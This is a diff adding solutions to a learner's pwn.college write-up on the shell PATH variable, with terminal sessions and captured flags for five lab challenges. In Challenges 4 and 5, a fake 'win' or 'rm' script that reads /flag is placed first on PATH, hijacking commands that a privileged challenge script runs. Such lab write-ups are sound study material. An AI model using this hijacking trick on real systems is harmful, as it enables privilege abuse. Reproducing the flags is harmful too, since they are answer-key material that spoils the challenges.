@@ -18,22 +18,27 @@ Keep in mind: /challenge/run will be a child process of your shell, so you must 
 
 ## Solution : 
 - Step 1 : Open ssh
-- Step 2 :
+- Step 2 : Set the PATH variable emoty using the proper commands and then run the correct command as instructed
 - Step 3 : Copy and paste the flag
 ```sh
-
+hacker@path~the-path-variable:~$ PATH=" "
+hacker@path~the-path-variable:~$ /challenge/run
+Trying to remove /flag...
+/challenge/run: line 4: rm: command not found
+The flag is still there! I might as well give it to you!
+pwn.college{MTc9773Ci_-om702DZ0phptGm85.QX2cDM1wSN4AzNzEzW}
 ```
 
 ## Flag : 
 ```sh
-
+pwn.college{MTc9773Ci_-om702DZ0phptGm85.QX2cDM1wSN4AzNzEzW}
 ```
 
 ### Reference : 
 None
 
 ### Notes : 
-Learnt
+Learnt about the PATH variable
 
 
 # Challenge 2 : Setting PATH
@@ -61,22 +66,26 @@ Let's practice. This level's /challenge/run will run the win command via its bar
 
 ## Solution : 
 - Step 1 : Open ssh
-- Step 2 :
+- Step 2 : Set the PATH variable as directed and then run the correct command
 - Step 3 : Copy and paste the flag
 ```sh
-
+hacker@path~setting-path:~$ PATH=/challenge/more_commands
+hacker@path~setting-path:~$ /challenge/run
+Invoking 'win'....
+Congratulations! You properly set the flag and 'win' has launched!
+pwn.college{cYXFRNoN5J8EIkwKBdJ2CeAiIgm.QX1cjM1wSN4AzNzEzW}
 ```
 
 ## Flag : 
 ```sh
-
+pwn.college{cYXFRNoN5J8EIkwKBdJ2CeAiIgm.QX1cjM1wSN4AzNzEzW}
 ```
 
 ### Reference : 
 None
 
 ### Notes : 
-Learnt
+Learnt how to set the PATH variable
 
 
 # Challenge 3 : Finding Commands
@@ -95,22 +104,25 @@ In this challenge, we added a win command somewhere in your $PATH, but it won't 
 
 ## Solution : 
 - Step 1 : Open ssh
-- Step 2 :
+- Step 2 : Find out the directory in which the flag is located and run the command 
 - Step 3 : Copy and paste the flag
 ```sh
-
+hacker@path~finding-commands:~$ which win
+/challenge/paths/29534/win
+hacker@path~finding-commands:~$ cat /challenge/paths/29534/flag
+pwn.college{w4ui4SqB0sENs1wQ4pFIy6KgH3U.01NzEzNxwSN4AzNzEzW}
 ```
 
 ## Flag : 
 ```sh
-
+pwn.college{w4ui4SqB0sENs1wQ4pFIy6KgH3U.01NzEzNxwSN4AzNzEzW}
 ```
 
 ### Reference : 
 None
 
 ### Notes : 
-Learnt
+Learnt how to find commands in the system
 
 
 # Challenge 4 : Adding Commands
@@ -139,22 +151,33 @@ Now, go and win!
 
 ## Solution : 
 - Step 1 : Open ssh
-- Step 2 :
+- Step 2 : Add commandas in the file and then execute them properly
 - Step 3 : Copy and paste the flag
+In code :
 ```sh
+#!/bin/bash
+/run/dojo/bin/cat /flag
+```
 
+In terminal :
+```sh
+hacker@path~adding-commands:~$ chmod ugo+x win
+hacker@path~adding-commands:~$ PATH=/home/hacker
+hacker@path~adding-commands:~$ /challenge/run
+Invoking 'win'....
+pwn.college{MzuyHS6xRekUEiH0ahZP0n_tHEw.QX2cjM1wSN4AzNzEzW}
 ```
 
 ## Flag : 
 ```sh
-
+pwn.college{MzuyHS6xRekUEiH0ahZP0n_tHEw.QX2cjM1wSN4AzNzEzW}
 ```
 
 ### Reference : 
 None
 
 ### Notes : 
-Learnt
+Learnt how to add commands to run
 
 
 # Challenge 5 : Hijacking Commands
@@ -165,19 +188,30 @@ How can you solve this? You know that rm is searched for in the directories list
 
 ## Solution : 
 - Step 1 : Open ssh
-- Step 2 :
+- Step 2 : Make a shebang named rm and then run the commands properly after making sure they are executable
 - Step 3 : Copy and paste the flag
+In code :
 ```sh
+#!/bin/bash
+/run/dojo/bin/cat /flag
+```
 
+In terminal :
+```sh
+hacker@path~hijacking-commands:~$ chmod ugo+x rm
+hacker@path~hijacking-commands:~$ PATH="/home/hacker/"
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+pwn.college{klvQylVjymsWQSIHm_Oxgi3V7-N.QX3cjM1wSN4AzNzEzW}
 ```
 
 ## Flag : 
 ```sh
-
+pwn.college{klvQylVjymsWQSIHm_Oxgi3V7-N.QX3cjM1wSN4AzNzEzW}
 ```
 
 ### Reference : 
 None
 
 ### Notes : 
-Learnt
+Learnt how to hijack commands
